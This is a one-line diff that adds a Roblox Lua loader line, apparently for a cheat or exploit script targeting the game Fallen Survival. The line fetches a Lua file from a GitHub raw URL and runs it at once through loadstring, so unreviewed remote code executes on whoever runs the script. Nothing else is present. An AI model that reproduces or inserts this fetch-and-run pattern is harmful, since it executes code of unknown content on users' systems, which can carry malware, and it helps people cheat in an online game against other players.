@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/new-map-fallen-survival-spam6-qwjudv51gtz7pb.lua"))()
